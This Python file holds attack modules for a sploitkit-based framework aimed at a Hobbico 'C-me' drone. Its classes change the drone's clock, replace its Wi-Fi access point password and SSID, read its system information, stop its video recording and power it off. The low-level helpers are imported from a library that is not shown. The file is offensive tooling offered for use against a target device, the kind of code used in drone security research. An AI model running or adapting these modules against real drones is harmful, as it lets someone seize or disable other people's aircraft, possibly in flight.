# -*- coding: UTF-8 -*-
from sploitkit import *

from lib.drones.hobbico import CmeModule


class ChangeDatetime(CmeModule):
    """ Change the datetime of the target C-me. """
    config = Config({
        Option(
            'NEW_DATETIME',
            "new datetime to be configured",
            True,
            #FIXME: validate=lambda s: [...],
        ): "01/01/1970 00:00:00",
        Option(
            'DATETIME_FORMAT',
            "datetime format to be considered",
            True,
        ): "%d/%m/%Y %H:%M:%S",
    })
    
    def run(self):
        self._change_datetime(self.config.get("NEW_DATETIME"),
                              self.config.get("DATETIME_FORMAT"))


class ChangeApPassword(CmeModule):
    """ Change the password of the target C-me's AP. """
    config = Config({
        Option(
            'NEW_PASSWORD',
            "Target's new password",
            True,
        ): "12345678",
    })
    
    def run(self):
        self._change_ap_creds(self.config.option("TARGET").value,
                              self.config.option("NEW_PASSWORD").value, False)


class ChangeApSsid(CmeModule):
    """ Change the SSID of the target C-me's AP. """
    config = Config({
        Option(
            'NEW_SSID',
            "Target's new SSID",
            True,
        ): "C-me-abcdef",
    })
    
    def run(self):
        essid = self.config.option("TARGET").value
        pswd = self.console.state['TARGETS'][essid]['password']
        self._change_ap_creds(self.config.option("NEW_SSID").value, pswd)


class GetSysInfo(CmeModule):
    """ Get system information from the target C-me. """
    def run(self):
        print_formatted_text(self._get_sysinfo())


class PowerOff(CmeModule):
    """ Power off the target C-me. """
    def run(self):
        self._power_off()


class StopVideo(CmeModule):
    """ Stop video recording of the target C-me. """
    def run(self):
        self._stop_video()
